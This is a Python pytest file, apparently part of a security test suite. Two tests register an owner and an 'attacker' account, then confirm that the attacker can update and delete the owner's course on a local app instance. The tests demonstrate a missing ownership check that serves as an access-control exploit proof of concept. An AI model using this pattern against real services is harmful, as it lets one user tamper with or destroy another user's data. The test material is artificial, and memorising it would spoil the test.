import requests

from helpers import create_course, delete_course, get_course, json_of, register, update_course


def test_exploit_vuln_004_any_authenticated_user_can_update_another_users_course(app_instance):
    """
    Exploit expectation:
    User A creates a course, then user B—who does not own that course—can still update it.
    """
    base_url = app_instance["base_url"]

    owner = requests.Session()
    attacker = requests.Session()

    r1 = register(owner, base_url, "course_owner", "pass123", "Course Owner")
    assert r1.status_code == 201, r1.text

    create_resp = create_course(owner, base_url, "Owner Course", "created by owner")
    assert create_resp.status_code == 201, create_resp.text
    course = json_of(create_resp)["course"]
    course_id = int(course["course_id"])

    r2 = register(attacker, base_url, "course_attacker", "pass123", "Course Attacker")
    assert r2.status_code == 201, r2.text

    update_resp = update_course(attacker, base_url, course_id, "Pwned Title", "attacker modified this")
    assert update_resp.status_code == 200, update_resp.text
    update_payload = json_of(update_resp)
    assert update_payload["success"] is True
    assert update_payload["course"]["title"] == "Pwned Title"
    assert update_payload["course"]["description"] == "attacker modified this"

    verify = get_course(owner, base_url, course_id)
    assert verify.status_code == 200, verify.text
    verify_payload = json_of(verify)
    assert verify_payload["course"]["title"] == "Pwned Title"
    assert verify_payload["course"]["description"] == "attacker modified this"


def test_exploit_vuln_004_any_authenticated_user_can_delete_another_users_course(app_instance):
    """
    Exploit expectation:
    User A creates a course, then user B—who does not own that course—can delete it.
    """
    base_url = app_instance["base_url"]

    owner = requests.Session()
    attacker = requests.Session()

    r1 = register(owner, base_url, "delete_owner", "pass123", "Delete Owner")
    assert r1.status_code == 201, r1.text

    create_resp = create_course(owner, base_url, "Delete Victim Course", "to be deleted by attacker")
    assert create_resp.status_code == 201, create_resp.text
    course_id = int(json_of(create_resp)["course"]["course_id"])

    r2 = register(attacker, base_url, "delete_attacker", "pass123", "Delete Attacker")
    assert r2.status_code == 201, r2.text

    del_resp = delete_course(attacker, base_url, course_id)
    assert del_resp.status_code == 200, del_resp.text
    del_payload = json_of(del_resp)
    assert del_payload["success"] is True

    verify = get_course(owner, base_url, course_id)
    assert verify.status_code == 404, verify.text